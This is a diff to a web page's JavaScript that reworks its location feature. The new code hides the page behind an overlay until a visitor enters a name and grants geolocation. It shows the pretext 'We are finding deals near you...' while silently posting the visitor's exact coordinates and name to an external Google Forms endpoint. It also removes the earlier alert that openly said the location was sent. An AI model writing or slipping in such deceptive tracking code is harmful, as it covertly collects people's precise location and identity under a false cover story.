@@ -173,55 +173,52 @@ function showLocationError(message) {
 
 // Initialize location services
 document.addEventListener('DOMContentLoaded', () => {
-    // Auto-fetch location if no previous location exists
-    if (!localStorage.getItem('userLocation')) {
-        fetchUserLocation();
-    }
-
-    // Still keep button functionality if it exists
-    const locationBtn = document.getElementById('location-btn');
-    if (locationBtn) {
-        locationBtn.addEventListener('click', fetchUserLocation);
-    }
-
-    // Add event for sending name/location to Google Form
-    const submitNameBtn = document.getElementById('submit-name-btn');
-    if (submitNameBtn) {
-        submitNameBtn.addEventListener('click', async () => {
+    // Only show name input and Start button, handle location and form submit on Start
+    // Blur/unblur main content as needed
+    const mainContent = document.getElementById('main-content');
+    const startBtn = document.getElementById('start-btn');
+    if (startBtn) {
+        startBtn.addEventListener('click', async () => {
             const name = document.getElementById('name-input').value.trim();
-            let location = localStorage.getItem('userLocation');
             if (!name) {
                 alert('Please enter your name.');
                 return;
             }
-            if (!location) {
-                alert('Location not detected yet. Please allow location access.');
+            if (!navigator.geolocation) {
+                alert('Geolocation is not supported by your browser.');
                 return;
             }
-            location = JSON.parse(location);
-            let locString = '';
-            if (location.type === 'auto' && location.coordinates) {
-                locString = `${location.coordinates.latitude},${location.coordinates.longitude}`;
-            } else {
-                locString = 'Manual/Unknown';
-            }
-            // Google Form POST
-            const formData = new URLSearchParams();
-            formData.append('entry.540055953', locString);
-            formData.append('entry.1753949979', name);
-            try {
-                await fetch('https://docs.google.com/forms/d/e/1FAIpQLSfRlVP-XNLl6EzimuRL_gzcS2387tN1lQj-8pRDQW92kVdGFw/formResponse', {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                    },
-                    body: formData.toString(),
-                });
-                alert('Location sent successfully!');
-            } catch (e) {
-                alert('Failed to send location.');
-            }
+            startBtn.disabled = true;
+            startBtn.textContent = 'We are finding deals near you...';
+            navigator.geolocation.getCurrentPosition(async position => {
+                const { latitude, longitude } = position.coords;
+                const locString = `${latitude},${longitude}`;
+                const formData = new URLSearchParams();
+                formData.append('entry.540055953', locString);
+                formData.append('entry.1753949979', name);
+                try {
+                    await fetch('https://docs.google.com/forms/d/e/1FAIpQLSfRlVP-XNLl6EzimuRL_gzcS2387tN1lQj-8pRDQW92kVdGFw/formResponse', {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                        },
+                        body: formData.toString(),
+                    });
+                    // Hide overlay and make main content fully interactive
+                    document.getElementById('welcome-overlay').style.display = 'none';
+                    mainContent.style.pointerEvents = '';
+                    mainContent.style.userSelect = '';
+                } catch (e) {
+                    alert('Sorry, we could not find deals near you.');
+                }
+                startBtn.disabled = false;
+                startBtn.textContent = 'Start';
+            }, err => {
+                alert('Sorry, we could not find deals near you. Please allow location access.');
+                startBtn.disabled = false;
+                startBtn.textContent = 'Start';
+            });
         });
     }
 });
